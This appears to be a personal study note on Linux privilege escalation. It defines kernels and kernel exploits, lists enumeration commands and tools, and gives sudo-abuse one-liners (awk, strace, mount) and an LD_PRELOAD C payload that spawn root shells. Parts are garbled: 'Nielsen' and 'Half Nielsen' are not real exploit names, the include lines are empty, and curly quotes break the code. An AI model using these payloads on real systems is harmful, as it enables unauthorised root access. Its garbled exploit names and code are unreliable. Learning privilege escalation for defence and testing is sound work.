***What's a Kernel***
A [[Linux]] Kernel is a computer program that control everything in the system.
The kernel facilitates the interaction between hardware and software. It's a translator, converting the IO into instruction.
The Kernel is loaded and stays in the Memory right after the bootloader loads up. It's responsible for loading the rest of the OS.
![[Pasted image 20240802065245.png]]
Source: https://en.wikipedia.org/wiki/Kernel_(operating_system)

***What's a Kernel Exploit?***
A kernel exploit consists of taking advantage of vulnerabilities discovered inside a specific version on the Linux Kernel.
Security Researchers are on the lookout to find and patch these vulnerabilities, but hackers also are always taking advantage of them if a patch is not found, if the patch has been found but the system was not fixed.
As a Security professionals, our job is to identify and patch these vulnerabilities before the hackers.

Some resources:
https://github.com/xairy/linux-kernel-exploitation
Also:
https://github.com/ankendenke/kernel-exploits

Steps to take control:
Manual commands:

***User and System Enum***
```
uname -a
whoami
id
sudo -l
```

After uname command, lookup on the resources above if the kernel version is listed on the vulnerability list.  Or lookup on google search.

Automated methods:

```
linpeas
linEnum

```
Kernel exploits consist of finding a bug in the kernel version at hand if it still exists and elevate our privilege to root, have unauthorized access to sensible area. Horizontal and vertical escalation are both methods to do damage to the system.
the most common exploits are:
- Dirty cow CVE-2016-5195 https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
- Nielsen 
- Half Nielsen

***Sudo Abuse***
Examples of privilege escalation abusing root
```
sudo awk 'BEGIN {system("/bin/sh")}'
```
```
sudo mount -o bind /bin/bash /bin/mount  
sudo mount
```
```
sudo strace -o/dev/null /bin/bash
```
LD_PRELOAD environment abuse
```
#include  
#include  
#include

void _init() {  
unsetenv(“LD_PRELOAD”);  
setresuid(0,0,0);  
system(“/bin/bash -p”);  
}

and then run it like so:  
gcc -fPIC -shared -o /tmp/x.so preload.c -nostartfiles  
sudo LD_PRELOAD=/tmp/x.so apache2

You’ll get shell.
```
